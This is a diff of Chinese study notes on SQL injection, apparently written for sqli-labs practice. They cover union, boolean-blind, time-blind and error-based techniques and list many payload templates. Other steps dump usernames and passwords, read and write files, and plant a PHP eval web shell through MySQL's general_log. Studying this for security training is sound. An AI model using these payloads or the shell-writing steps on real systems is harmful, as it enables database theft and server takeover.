@@ -11,6 +11,8 @@
 
 查询当前数据库：select database()
 
+
+
 ### union和union all
 
 **表数据:**![image-20220905205228167](SQL注入.assets/image-20220905205228167.png)
@@ -39,9 +41,9 @@ SELECT id FROM emp_tbl UNION ALL SELECT NAME FROM emp_tbl
 
 
 
+### 常用函数:
 
-
-### concat和group_concat
+#### concat和group_concat
 
 **表结构:**![image-20220905201127882](SQL注入.assets/image-20220905201127882.png)
 
@@ -97,7 +99,7 @@ SELECT GROUP_CONCAT(id ,"--",NAME SEPARATOR '||' ),DATE FROM emp_tbl
 
 
 
-### length()
+#### length()
 
 **表数据:**![image-20220905203531159](SQL注入.assets/image-20220905203531159.png)
 
@@ -113,7 +115,7 @@ SELECT LENGTH(NAME) FROM emp_tbl			#汉字在utf8编码中,汉字占3个字节,�
 
 
 
-### mid()
+#### mid()
 
 **表数据:**![image-20220905203832222](SQL注入.assets/image-20220905203832222.png)
 
@@ -129,7 +131,7 @@ SELECT MID(title,2,7) FROM w3cs_tbl  #从查询结果不难看出,mid()函数起
 
 
 
-### left()
+#### left()
 
 LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。==同样,mysql中也有right()函数,right()参数和left()函数一致,不过作用是从最右边开始返回指定长度的字符串==
 
@@ -154,7 +156,7 @@ LEFT()函数返回str字符串中最左边的长度字符。如果str或length�
 
 请注意，SUBSTRING(或SUBSTR)函数也提供与LEFT函数相同的功能。
 
-### substr()
+#### substr()
 
 substr和mid函数的作用和用法基本相同，只不过substr支持的数据库更多，mid只支持mysql数据库。
 
@@ -182,7 +184,96 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
 **查询结果:**![image-20220905210316918](SQL注入.assets/image-20220905210316918.png)
 
+#### sleep()
 
+sleep函数可以让sql执行的时候暂停数秒（可小数），函数的返回结果为0.
+
+#### if(expr1,expr2,expr3)
+
+语法如下：
+
+IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。
+
+#### count()
+
+count函数是用来统计表中或数组中记录的一个函数，下面我来介绍在MySQL中count函数用法与性能比较吧。count(*) 它返回检索行的数目， 不论其是否包含 NULL值。
+
+#### load_file()
+
+load_file()可以用来读取文件，此函数的执行必须使用dba权限或者root权限。
+
+需要注意的是：
+
+mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。
+
+- ure_file_priv的值为null ，表示限制mysqld 不允许导入,导出
+- 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入,导出只能发生在/tmp/目录下
+- 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入,导出做限制
+
+如何查看secure-file-priv参数的值：
+
+```sql
+show global variables like '%secure%';
+```
+
+#### into outfile()
+
+into outfile()函数可以将字符串写入文件，此函数的执行也需要很大的权限，并且目标目录可写。
+
+
+
+
+
+
+
+
+
+
+
+## SQLi基本常识
+
+1. 什么是SQLi?
+
+​	SQLi(SQL injection),SQL注入
+
+2. SQL注入的原理是什么?
+
+   由于后端代码对于前端输入的识别和处理的不严谨,导致攻击者从前端提交的SQL语句片段被拼接到后端数据库查询语句中,执行语句外的SQL查询
+
+3. SQL注入的危害是什么?
+
+   条件满足的情况下会造成：拖库、写入文件、执行系统命令等。
+
+   浅显的说法：盗窃系统机密数据、能够篡改网站页面、接管服务器
+
+4. 找到一个SQL注入,如何利用?
+
+   拖库、写入文件、执行系统命令等。
+
+   能执行系统命令后,判断用户权限,如果是管理员权限,就有很多可做的事情,比如远程控制等
+
+5. 通用的SQL注入的思路：
+
+   1. 找到注入点
+   2. 猜测后端查询语句
+      1. 判断注入类型
+      2. 判断闭合符
+   3. 判断数据库版本是否大于4,以便后面使用information_schema库
+   4. 构造注入
+
+6. 联合查询SQLi的思路:
+
+   1. 找到注入点
+   2. 猜测后端查询语句
+      1. 判断注入类型
+      2. 判断闭合符
+   3. 判断数据库版本是否大于4,以便后面使用information_schema库
+   4. 判断字段数
+   5. 判断显示位
+   6. 查库名
+   7. 查表名
+   8. 查列名
+   9. 查记录
 
 ## information_schema库
 
@@ -258,6 +349,12 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
+
+
+## 注意:
+
+==只有使用了union查询的情况下,才需要判断网站使用的表的字段数,使用and则不需要!!!==
+
 ## 联合查询注入
 
 注入流程:
@@ -274,11 +371,13 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    注:如果加入一个结束符后出现报错,则代表参数的结束符最少包含该字符,也可能还有别的字符
 
-3. 通过order by num的方式让系统自己报错,慢慢尝试从而找到数据库的准确列数
+3. 判断数据库版本是否大于4,以便后面使用information_schema库
 
-4. 给原有的url中的字段指定一个不存在的值,使其查不到内容,从而显示联合查询后面的内容
+4. 通过order by num的方式让系统自己报错,慢慢尝试从而找到数据库的准确列数
 
-5. 判断显示位置:
+5. 给原有的url中的字段指定一个不存在的值,使其查不到内容,从而显示联合查询后面的内容
+
+6. 判断显示位置:
 
    ```mysql
    select * from t_xx where c_xx = -1 union select 1,2,3,4,...  #有多少个order by 找出多少个字段,union后就要写多少个字段
@@ -286,13 +385,13 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
-6. 联合查询字段中带上database()查看当前网站所使用的数据库名
+7. 联合查询字段中带上database()查看当前网站所使用的数据库名
 
    ```mysql
    select * from t_xx where c_xx = -1 union select 1,database(),3,4,5,...
    ```
 
-7. 在information_schema库中根据数据库名查表名
+8. 在information_schema库中根据数据库名查表名
 
    ```mysql
    select * from t_xx where c_xx = -1 union select 1,2,table_name3,4,5... from information_schema.tables where table_schema = "第6步查到的库名"	#只能查到并显示一张表
@@ -303,7 +402,7 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
-8. 查询关键表的字段
+9. 查询关键表的字段
 
    ```mysql
    select * from t_xx where c_xx = -1 union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_schema="库名" and table_name="7步查到的表名" 
@@ -313,7 +412,7 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
-9. 查询关键字段(如username,password等)的记录,得到用户名和密码.(密码有可能是被加密过的,如果是md5加密,可以用cmd5尝试解密)
+10. 查询关键字段(如username,password等)的记录,得到用户名和密码.(密码有可能是被加密过的,如果是md5加密,可以用cmd5尝试解密)
 
    ```mysql
    select * from t_xx where c_xx = -1 union select 1,2,group_caoncat(username,"=",password),4,5 from 表名
@@ -321,7 +420,7 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
    
 
-10. 解密过后即可通过用户名和密码登录到系统当中!
+11. 解密过后即可通过用户名和密码登录到系统当中!
 
     md5在线解密:
 
@@ -454,97 +553,17 @@ SELECT SUBSTR(title,2,6) FROM w3cs_tbl
 
 
 
-1. 什么是SQLi?
+## 布尔盲注
 
-​	SQLi(SQL injection),SQL注入
+### 使用场景:
 
-2. SQL注入的原理是什么?
+找到注入点后,==不管提交任何参数,添加任何闭合符,都只有显示或者不显示内容两种情况,就算提交错误的sql语句也没有任何错误回显==,则可以尝试使用布尔盲注进行注入
 
-​	由于后端代码对于前端输入的识别和处理的不严谨,导致攻击者从前端提交的SQL语句片段被拼接到后端数据库查询语句中,执行语气外的SQL查询
-
-3. SQL注入的危害是什么?
-
-​	条件满足的情况下会造成：拖库、写入文件、执行系统命令等。
-
-​	浅显的说法：盗窃系统机密数据、能够篡改网站页面、接管服务器
-
-4. 找到一个SQL注入,如何利用?
-
-   拖库、写入文件、执行系统命令等。
-
-   能执行系统命令后,判断用户权限,如果是管理员权限,就有很多可做的事情,比如远程控制等
-
-5. 通用的SQL注入的思路：
-
-   1. 找到注入点
-   2. 判断注入类型
-   3. 判断闭合符
-   4. 构造注入
-
-6. 联合查询SQLi的思路:
-
-   1. 找到注入点
-   2. 判断注入类型
-   3. 判断闭合符
-   4. 猜测后端查询语句
-   5. 判断字段数
-   6. 判断显示位
-   7. 查库名
-   8. 查表名
-   9. 查列名
-   10. 查记录
-
-
-
-
-
-
-
-"select * from 数据库相应表名  where   id = '  2'     --   '   limit 0,1       ;";
-
-
-
-## 布尔型SQL注入
-
-### 基本函数
+### 常用基本函数
 
 #### ascii()
 
 ascii函数用来返回字符串str的最左面字符的ASCII代码值（十进制）。如果str是空字符串，返回0。如果str是NULL，返回NULL。这个函数可以和substr函数配合来使用猜测一个字符。
-
-#### 布尔型SQLi的利用步骤
-
-1. 找到注入点
-2. 判断注入类型
-3. 猜测闭合符
-4. 猜测后端查询语句
-5. 构造注入
-6. 注入到url参数中提交
-7. 不停变换比较的数字,逼出我们想要查询的字母的ASCII码
-8. ASCII码表中反查字符
-9. 反复操作,查询出所有想查询的内容
-
-猜想:
-
-1. 是不是应该先猜库名的长度,然后再去猜库名每一位对应的字符?
-
-2. 表名是否是  通过布尔型SQLi在database()的位置构造一个查询语句去查表名然后逐位猜测
-
-3. 字段的记录是否也是这样去猜测?
-
-
-
-
-
-#### 报错注入的利用步骤
-
-
-
-
-
-#### sleep()
-
-sleep函数可以让sql执行的时候暂停数秒（可小数），函数的返回结果为0.
 
 #### if(expr1,expr2,expr3)
 
@@ -556,24 +575,217 @@ IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果
 
 count函数是用来统计表中或数组中记录的一个函数，下面我来介绍在MySQL中count函数用法与性能比较吧。count(*) 它返回检索行的数目， 不论其是否包含 NULL值。
 
-#### load_file()
+#### 布尔型SQLi的利用步骤
 
-load_file()可以用来读取文件，此函数的执行必须使用dba权限或者root权限。
+1. 找到注入点
 
-需要注意的是：
+2. 猜测后端查询语句
 
-mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。
+   1. 判断注入类型
+   2. 猜测闭合符
 
-- ure_file_priv的值为null ，表示限制mysqld 不允许导入,导出
-- 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入,导出只能发生在/tmp/目录下
-- 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入,导出做限制
+3. 构造注入语句
 
-如何查看secure-file-priv参数的值：
+   比如:ascii(substr(database(), 1, 1))>1
 
-```sql
-show global variables like '%secure%';
+   ```mysql
+   #基本构造语句
+   select * from t_xx where c_xx = '1' and 0%23' LIMIT 0,1
+   # 完整注入语句
+   select * from t_xx where c_xx = '1' and ascii(substr(database(), 1,
+   1))>1%23' LIMIT 0,1
+   ```
+
+   
+
+4. 注入到url参数中提交
+
+5. 不停变换比较的数字,找出我们想要查询的字母的ASCII码
+
+6. ASCII码表中反查字符
+
+7. 反复操作,查询出所有想查询的内容
+
+## 时间盲注
+
+### 适用场景:
+
+==不管提交任何参数,添加任何闭合符,都是返回一个同样的界面,没有任何错误回显或者不显示的情况==,则可以尝试使用时间盲注来判断注入类型和闭合符以及执行后面的注入语句
+
+
+
+
+
+先构造一个注入语句,把最后的注释加上,如果注入类型和闭合符判断正确,则会产生3秒延时
+
+```mysql
+http://192.168.96.135/sqli-labs/Less-9/
+?id=-1 and if(3>2,sleep(3),1)
+--+
 ```
 
-#### into outfile()
 
-into outfile()函数可以将字符串写入文件，此函数的执行也需要很大的权限，并且目标目录可写。
+
+### 常用函数:
+
+#### sleep(n),延时n秒
+
+### 时间盲注利用步骤
+
+1. 找注入点
+2. 猜测后端查询语句
+   1. 判断注入类型(数字型还是字符型)
+   2. 判断闭合符
+3. 构造注入
+
+## 报错注入
+
+报错注入常用场景:
+
+找到注入点之后==不管提交任何参数,都只有显示或不显示内容两种情况,并且如果有SQL语句错误,可以看到数据库管理系统输出的错误,==则可以使用报错注入的方式进行注入
+
+### floor()报错注入
+
+双（查询）注入，又称floor报错注入，想要查询select database()，只需要输入后面语句即可在MySQL报错语句中查询出来：
+
+```mysql
+1、union select count(*), concat((payload), floor(rand()*2)) as a from information_schema.tables group by a
+2、and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)
+```
+
+count(*)是必须带上的。
+限制：
+
+1. 输出字符长度限制为32个字符,查询到的数据超长无法显示的,可以使用substr()函数截取之后分段显示
+2. 后台返回记录列数至少2列
+
+报错注入需要满足的条件:
+
+1. 注入语句中查询用到的表内数据必须>=3条
+2. floor()报错注入在MySQL版本8.0 已失效，经过测试7.3.4nts也已失效
+
+### updatexml()报错注入
+
+- **介绍：**`updatexml()`是一个使用不同的xml标记匹配和替换xml块的函数。
+- **作用：**改变文档中符合条件的节点的值
+- **语法：**`updatexml(XML_document，XPath_string，new_value)` 第一个参数：是`string`格式，为XML文档对象的名称，文中为Doc ;第二个参数：代表`路径`，Xpath格式的字符串例如//title【@lang】; 第三个参数：`string`格式，替换查找到的符合条件的数据
+- **原理：**`updatexml`使用时，当`xpath_string`格式出现错误，`mysql`则会爆出xpath语法错误（`xpath syntax`）
+- **例如：** `select * from test where ide = 1 and (updatexml(1,0x7e,3));` 由于`0x7e`是`~`，不属于xpath语法格式，因此报出xpath语法错误。
+
+MySQL执行1=(updatexml(1,concat(0x3a,(payload)),1))将报错。
+限制1：
+
+1. 输出字符长度限制为32个字符
+2. 仅payload返回的不是xml格式，才会生效
+
+### ExtractValue()报错注入
+
+- **介绍：**此函数从目标XML中返回包含所查询值的字符串
+- **语法：**`extractvalue(XML_document，xpath_string)` 第一个参数：`string`格式，为XML文档对象的名称，第二个参数：`xpath_string`（xpath格式的字符串） `select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`
+- **作用：**`extractvalue`使用时当`xpath_string`格式出现错误，mysql则会爆出xpath语法错误（`xpath syntax`）
+- **例如：**`select user,password from users where user_id=1 and (extractvalue(1,0x7e));`
+- **原理：**由于`0x7e`就是`~`不属于xpath语法格式，因此报出xpath语法错误。
+
+#### 模板1：
+
+```
+and extractvalue('anything',concat('/',(Payload)))    将报错，不推荐使用。
+```
+
+#### 模板2：
+
+```
+union select 1,(extractvalue(1,concat(0x7e,(payload),0x7e))),3  不存在丢失报错成果的情况。推荐使用
+```
+
+#### 其他模板
+
+```
+1、通过floor报错,注入语句如下:
+and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+2、通过ExtractValue报错,注入语句如下:
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+3、通过UpdateXml报错,注入语句如下:
+and 1=(updatexml(1,concat(0x3a,(payload)),1))
+
+4、通过NAME_CONST报错,注入语句如下:
+and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+5、通过join报错,注入语句如下:
+select * from(select * from mysql.user ajoin mysql.user b)c;
+
+6、通过exp报错,注入语句如下:
+and exp(~(select * from (select user () ) a) );
+
+7、通过GeometryCollection()报错,注入语句如下:
+and GeometryCollection(()select *from(select user () )a)b );
+
+8、通过polygon ()报错,注入语句如下:
+and polygon (()select * from(select user ())a)b );
+
+9、通过multipoint ()报错,注入语句如下:
+and multipoint (()select * from(select user() )a)b );
+
+10、通过multlinestring ()报错,注入语句如下:
+and multlinestring (()select * from(selectuser () )a)b );
+
+11、通过multpolygon ()报错,注入语句如下:
+and multpolygon (()select * from(selectuser () )a)b );
+
+12、通过linestring ()报错,注入语句如下:
+and linestring (()select * from(select user() )a)b );
+```
+
+
+
+## 文件读写
+
+### 读文件
+
+select load_file("路径和文件名");
+load data infile() ;
+
+> load data infile 和 load data local infile ，不受 secure-file-priv 的限制 
+
+### 写文件
+
+```mysql
+SELECT "123" INTO OUTFILE "c:/123.txt";
+SELECT "123abc" INTO DUMPFILE "c:/123.txt";
+```
+
+注：dumpfile可以处理非可见字符。
+
+要使用union查询写文件，不能使用and或者or拼接写文件
+
+#### 条件
+
+1. 绝对路径
+2. `secure_file_priv `选项的值为空(my.ini文件中设置为`secure_file_priv=`
+默认是NULL，可以通过my.conf/my.ini文件mysqld一栏里进行配置，配置完成后，重启便会生效。
+
+#### 文件上传思路步骤：
+
+1. 找到注入点
+2. 判断列数
+3. 猜测后端查询语句
+  1. 判断注入类型
+  2. 判断闭合符
+4. 构造注入
+  SELECT "123" INTO OUTFILE "c:/123.txt";
+  select * from t_xx where c_xx=(('xx')) union SELECT 1,2,"123" INTO OUTFILE "c:/123.txt";%23'))
+
+### 知识点拓展
+
+在能够直接执行sql语句的应用中，如何通过SQL语句写日志getshell（文件上传学了之后再看）
+
+```mysql
+SHOW VARIABLES LIKE '%general%';# 查看日志配置（开关、位置）
+set global general_log=on;# 开启日志
+set global general_log_file='C:/phpstudy/www/methehack.php';# 设置日志位置为网站
+目录
+select '<?php eval($_POST["a"]); ?>'#执行生成包含木马日志的查询
+```
+
